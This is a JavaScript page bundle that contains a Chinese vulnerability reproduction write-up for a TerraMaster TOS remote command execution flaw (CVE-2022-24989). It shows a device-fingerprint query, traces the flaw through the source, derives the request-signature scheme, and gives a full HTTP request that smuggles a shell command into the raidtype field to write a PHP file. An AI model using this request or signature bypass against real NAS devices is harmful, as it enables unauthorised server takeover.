import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as t}from"./app-58e4a7d6.js";const n={},d=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>TerraMaster TOS mobile.class.php文件的createRaid方法存在远程命令执行漏洞 ，攻击者配合 CVE-2022-24990漏洞可以获取服务器权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>TerraMaster TOS &lt; 4.2.31
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;TerraMaster&quot; &amp;&amp; header=&quot;TOS&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241538897.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>查看 <code>mobile.class.php文件</code>中的 <code>createRaid方法</code>, 其中参数<code>raidtype和参数diskstring</code>均为可控参数</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241540547.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>注意这一行代码并跟踪 <code>volume_make_from_disks</code> 方法</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ret = $vol-&gt;volume_make_from_disks($this-&gt;in[&#39;raidtype&#39;], $filesystem, $disks, $volume_size);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241540535.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可以看到方法调用中的 <code>$levek</code> 参数是可控参数，传入 <code>_backexec</code>方法中，可导致命令拼接执行恶意命令</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241540532.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>回到 <code>mobile.class.php</code> 文件开头的定义</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>static $notCheck = [
        &quot;webNasIPS&quot;, &quot;getDiskList&quot;, &quot;createRaid&quot;, &quot;getInstallStat&quot;, &quot;getIsConfigAdmin&quot;, &quot;setAdminConfig&quot;, &quot;isConnected&quot;,&#39;createid&#39;,
        &#39;user_create&#39;,&#39;user_bond&#39;,&#39;user_release&#39;,&#39;login&#39;, &#39;logout&#39;, &#39;checkCode&#39;, &quot;wapNasIPS&quot;
    ];
    //不验证头信息是否匹配...
    static $notHeader = [&quot;fileDownload&quot;, &quot;videoPlay&quot;, &quot;imagesThumb&quot;, &quot;imagesView&quot;, &quot;fileUpload&quot;, &quot;tempClear&quot;, &quot;wapNasIPS&quot;, &quot;webNasIPS&quot;, &quot;isConnected&quot;];
    private static $U = null;
    private static $filter = array(&quot;.&quot;, &quot;..&quot;, &quot;.svn&quot;, &quot;lost+found&quot;, &quot;aquota.group&quot;, &quot;aquota.user&quot;);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>发现 <code>$notHeader</code> 数组中并不存在方法名 <code>createRaid</code>，看一下 api.php 中的定义</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241540534.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$instance = new $class();
if (!in_array($function, $class::$notHeader)) {
    #防止请求重放验证...
    if (tos_encrypt_str($_SERVER[&#39;HTTP_TIMESTAMP&#39;]) != $_SERVER[&#39;HTTP_SIGNATURE&#39;] || $_SERVER[&#39;REQUEST_TIME&#39;] - $_SERVER[&#39;HTTP_TIMESTAMP&#39;] &gt; 300) {
        $instance-&gt;output(&quot;Illegal request, timeout!&quot;, 0);
    }
}
$instance-&gt;$function();
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>由于实例化的过程中存在验证请求头，所以需要通过if判断才能调用该方法进行命令执行</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>if (tos_encrypt_str($_SERVER[&#39;HTTP_TIMESTAMP&#39;]) != $_SERVER[&#39;HTTP_SIGNATURE&#39;] || $_SERVER[&#39;REQUEST_TIME&#39;] - $_SERVER[&#39;HTTP_TIMESTAMP&#39;] &gt; 300) {
        $instance-&gt;output(&quot;Illegal request, timeout!&quot;, 0);
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>看到这里主要是两个参数值得关注: <code>HTTP_TIMESTAMP</code> 和 <code>HTTP_SIGNATURE</code></p><p>跟踪方法 tos_encrypt_str 在源码中并没有找到，我们查看下php扩展函数列表</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241542899.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241540546.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>下载这个 so文件使用 IDA打开 搜索字符串 <code>tos_encrypt_str</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241540062.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241540650.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>跟进方法 <code>get_mac_addr</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241540673.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这里可以看到获取 <code>eth0网卡</code>的 <code>mac</code>，再经过 <code>php_sprintf</code>， 跟进下 <code>&amp;ubk_38fa</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241540686.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>实际上就是获取了 mac的最后3个字节, 例如mac地址为: 11.22.33.44.55.66, 经过后获取为 445566</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241540675.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>回到函数执行的地方，我们就可以知道，实际上这个函数等同于</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># mac addr 11:22:33:44:55:66
tos_encrypt_str(xxxxxx) = md5(445566xxxxxx)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>看看之前的判断代码</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$instance = new $class();
if (!in_array($function, $class::$notHeader)) {
    #防止请求重放验证...
    if (tos_encrypt_str($_SERVER[&#39;HTTP_TIMESTAMP&#39;]) != $_SERVER[&#39;HTTP_SIGNATURE&#39;] || $_SERVER[&#39;REQUEST_TIME&#39;] - $_SERVER[&#39;HTTP_TIMESTAMP&#39;] &gt; 300) {
        $instance-&gt;output(&quot;Illegal request, timeout!&quot;, 0);
    }
}
$instance-&gt;$function();
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>TIMESTAMP参数为当前时间戳，这里的判断逻辑就很清楚了</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>md5(mac地址后三字节 + 当前时间戳) = $_SERVER[&#39;HTTP_SIGNATURE&#39;]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>通过之前提到的漏洞 <code>CVE-2022-24990</code> 泄漏的 PWD和mac地址，我们就可以利用这个命令执行漏洞了, 通过刚刚的逻辑写POC获取信息</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241540649.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在发送请求包写入 php恶意文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /module/api.php?mobile/createRaid HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Authorization: $1$hq6UR8XW$ti.QT5f9wQQg1PcJFWdub/
Cache-Control: max-age=0
Content-Length: 82
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=f1d33267c0ee0c34e9a348402205e272; tos_visit_time=1647670158
Signature: e856010781d0efd904d57ac40517859c
Timestamp: 1647678138
Upgrade-Insecure-Requests: 1
User-Agent: TNAS

raidtype=%3Becho+%22%3C%3Fphp+phpinfo%28%29%3B%3F%3E%22%3Evuln.php&amp;diskstring=XXXX
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241540638.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问写入的文件</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241543426.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,49),s=[d];function l(c,o){return i(),a("div",null,s)}const p=e(n,[["render",l],["__file","TerraMaster TOS createRaid 远程命令执行漏洞 CVE-2022-24989.html.vue"]]);export{p as default};
